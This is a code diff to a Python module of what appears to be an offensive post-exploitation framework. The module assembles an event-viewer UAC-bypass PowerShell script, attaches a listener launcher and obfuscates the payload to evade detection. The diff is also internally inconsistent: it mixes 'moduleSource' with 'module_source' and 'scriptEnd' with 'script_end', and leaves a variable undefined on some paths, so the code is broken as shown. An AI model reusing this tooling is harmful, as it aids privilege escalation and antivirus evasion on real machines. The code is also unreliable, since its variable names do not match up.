@@ -1,5 +1,6 @@
 from __future__ import print_function
 
+import pathlib
 from builtins import object
 from builtins import str
 from typing import Dict
@@ -30,18 +31,21 @@ class Module(object):
 
         # read in the common module source code
         moduleSource = main_menu.installPath + "/data/module_source/privesc/Invoke-EventVwrBypass.ps1"
-        if obfuscate:
-            data_util.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscation_command)
-            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
+        if main_menu.obfuscate:
+            obfuscated_module_source = module_source.replace("module_source", "obfuscated_module_source")
+            if pathlib.Path(obfuscated_module_source).is_file():
+                module_source = obfuscated_module_source
+
         try:
-            f = open(moduleSource, 'r')
+            with open(module_source, 'r') as f:
+                module_code = f.read()
         except:
-            return handle_error_message("[!] Could not read module source path at: " + str(moduleSource))
+            return handle_error_message("[!] Could not read module source path at: " + str(module_source))
 
-        moduleCode = f.read()
-        f.close()
-
-        script = moduleCode
+        if main_menu.obfuscate and not pathlib.Path(obfuscated_module_source).is_file():
+            script = data_util.obfuscate(installPath=main_menu.installPath, psScript=module_code, obfuscationCommand=main_menu.obfuscateCommand)
+        else:
+            script = module_code
 
         if not main_menu.listeners.is_listener_valid(listenerName):
             # not a valid listener, return nothing for the script
@@ -60,10 +64,9 @@ class Module(object):
             else:
                 scriptEnd = "Invoke-EventVwrBypass -Command \"%s\"" % (encScript)
 
-        if obfuscate:
-            scriptEnd = helpers.obfuscate(main_menu.installPath, psScript=scriptEnd,
-                                          obfuscationCommand=obfuscation_command)
-        script += scriptEnd
+        if main_menu.obfuscate:
+            script_end = data_util.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=main_menu.obfuscateCommand)
+        script += script_end
         script = data_util.keyword_obfuscation(script)
 
         return script
